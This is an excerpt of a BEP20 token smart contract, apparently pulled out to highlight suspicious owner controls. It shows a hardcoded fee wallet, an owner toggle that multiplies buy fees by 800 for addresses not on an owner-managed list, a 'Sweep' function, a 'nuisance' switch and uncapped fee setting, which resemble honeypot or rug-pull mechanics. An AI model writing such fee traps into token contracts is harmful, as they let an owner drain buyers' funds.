...
contract ss is IBEP20, Auth {
    ...
    uint256 public totalFee        = marketingFee + rewardFee + liquidityFee + teamFee + burnFee + buybackFee;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x84909fDDc578752840a6C93869088B267FD726A9;
        teamFeeReceiver = 0x84909fDDc578752840a6C93869088B267FD726A9;
        buybackFeeReceiver = 0x84909fDDc578752840a6C93869088B267FD726A9;
    ...
    function takeFee(address sender, uint256 amount, bool isSell, address receiver) internal returns (uint256) {
        ...
        if(BoostMode && !isBoosted[receiver] && !isSell){
            multiplier = 800;
        }
    ...
    function Sweep(uint256 amountPercentage) external authorized {
    ...
    function enable_nuisance(bool _status) public onlyOwner {
     ...
     function enable_Boost(bool _status) public onlyOwner {
        BoostMode = _status;
    }
    //GK
    ...
    function manage_Boost(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isBoosted[addresses[i]] = status;
        }
    }
    ...
    function setFees(uint256 _liquidityFee, uint256 _rewardFee, uint256 _marketingFee, uint256 _teamFee, uint256 _buybackFee, uint256 _burnFee, uint256 _feeDenominator) external authorized {
        ...
        burnFee = _burnFee;
        totalFee = _liquidityFee + _rewardFee + _marketingFee + _teamFee + _burnFee + _buybackFee;
